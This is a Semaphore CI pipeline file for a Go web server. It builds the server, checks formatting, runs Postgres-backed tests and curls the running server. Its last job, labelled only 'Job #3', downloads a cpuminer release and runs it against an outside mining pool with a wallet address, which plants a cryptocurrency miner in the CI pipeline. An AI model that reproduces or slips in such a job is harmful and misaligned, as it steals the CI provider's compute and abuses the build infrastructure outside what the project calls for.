version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - checkout
            - sem-version go 1.12
            - go get github.com/lib/pq
            - go build webServer.go
            - artifact push workflow webServer --force
  - name: Check code style
    task:
      jobs:
        - name: gofmt
          commands:
            - checkout
            - sem-version go 1.12
            - sudo apt install -y gccgo-go
            - gofmt webServer.go | diff --ignore-tab-expansion webServer.go -
  - name: Run tests
    task:
      prologue:
        commands:
          - checkout
          - sem-version go 1.12
      jobs:
        - name: go test
          commands:
            - sem-service start postgres
            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
            - go get github.com/lib/pq
            - go test ./... -v
        - name: Test web server
          commands:
            - mkdir bin
            - artifact pull workflow webServer
            - mv webServer bin
            - chmod +x ./bin/webServer
            - ./bin/webServer 8001 &
            - 'curl --silent localhost:8001/time | grep "The current time is"'
        - name: 'Job #3'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.2 -t 6'
